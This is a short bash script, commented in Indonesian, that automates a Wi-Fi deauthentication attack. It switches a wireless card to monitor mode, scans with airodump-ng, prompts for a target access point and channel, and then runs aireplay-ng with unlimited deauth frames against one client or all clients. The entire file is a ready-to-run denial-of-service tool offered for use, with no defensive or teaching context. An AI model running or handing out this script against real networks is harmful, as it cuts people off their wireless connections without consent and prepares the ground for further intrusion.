#!/bin/bash

# Ganti interface dengan interfacemu
IFACE="wlp3s0"

echo "[*] Mengaktifkan monitor mode..."
sudo ip link set $IFACE down
sudo iw dev $IFACE set type monitor
sudo ip link set $IFACE up

echo "[*] Menjalankan airodump-ng (tekan Ctrl+C jika sudah menemukan target)..."
sleep 2
sudo airodump-ng $IFACE

echo
read -p "[?] Masukkan BSSID target (WiFi AP): " BSSID
read -p "[?] Masukkan channel (CH): " CH

echo
echo "[1] Deauth ke 1 klien saja"
echo "[2] Deauth ke SEMUA klien"
read -p "[?] Pilih mode serangan (1/2): " MODE

if [ "$MODE" == "1" ]; then
    read -p "[?] Masukkan MAC address klien: " CLIENT
fi

echo "[*] Mengatur channel ke $CH..."
sudo iwconfig $IFACE channel $CH
sleep 1

echo
if [ "$MODE" == "1" ]; then
    echo "[*] Menjalankan deauth terus-menerus ke klien $CLIENT..."
    sudo aireplay-ng --deauth 0 -a $BSSID -c $CLIENT $IFACE
else
    echo "[*] Menjalankan deauth terus-menerus ke SEMUA klien..."
    sudo aireplay-ng --deauth 0 -a $BSSID $IFACE
fi

echo
read -p "[?] Apakah ingin mengembalikan interface ke mode normal? (y/n): " jawab

if [[ "$jawab" == "y" || "$jawab" == "Y" ]]; then
    echo "[*] Mengembalikan ke managed mode..."
    sudo ip link set $IFACE down
    sudo iw dev $IFACE set type managed
    sudo ip link set $IFACE up
    echo "[✔] Interface kembali ke mode normal."
else
    echo "[!] Interface tetap dalam mode monitor."
fi

